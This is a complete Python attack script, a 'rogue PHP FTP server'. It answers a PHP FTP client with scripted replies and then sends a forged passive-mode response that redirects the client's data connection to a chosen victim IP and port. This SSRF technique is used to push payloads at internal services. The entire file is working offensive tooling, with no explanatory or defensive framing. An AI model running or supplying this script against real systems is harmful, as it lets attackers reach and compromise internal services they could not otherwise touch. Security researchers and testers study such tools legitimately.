#!/usr/bin/env python3

import socket
import sys

def main():
    if len(sys.argv) != 4:
        print('USAGE: ./rogue_php_ftp_server.py [VICTIM_IP|VICTIM_HOST] [VICTIM_PORT] [FTP_PORT]')
        sys.exit(1)

    try:
        victim_ip = socket.gethostbyname(sys.argv[1])
    except socket.error:
        print('Error: No address associated with hostname {0}'.format(sys.argv[1]))
        sys.exit(1)

    try:
        victim_port = int(sys.argv[2], 0)
    except ValueError:
        print('Error: Invalid port {0}'.format(sys.argv[2]))
        sys.exit(1)

    try:
        ftp_port = int(sys.argv[3], 0)
    except ValueError:
        print('Error: Invalid port {0}'.format(sys.argv[2]))
        sys.exit(1)

    # chop IP and port into bytes
    h1, h2, h3, h4 = socket.inet_aton(victim_ip)
    p1, p2 = victim_port // 0x100, victim_port % 0x100

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as s:
        s.bind(('0.0.0.0', ftp_port))
        s.listen()
        conn, _ = s.accept()
        conn.send(b'220 (ROGUE PHP FTP SERVER)\n')
        conn.recv(1024)
        conn.send(b'331 Please specify the password.\n')
        conn.recv(1024)
        conn.send(b'230 Login successful.\n')
        conn.recv(1024)
        conn.send(b'200 Switching to Binary mode.\n')
        conn.recv(1024)
        conn.send(b'550 Could not get file size.\n')
        conn.recv(1024)
        conn.send(b'550 Permission denied.\n')
        conn.recv(1024)
        conn.send(f'227 Entering Passive Mode ({h1},{h2},{h3},{h4},{p1},{p2}).\n'.encode())
        conn.recv(1024)
        conn.send(b'150 Ok to send data.\n')

if __name__ == '__main__':
    main()
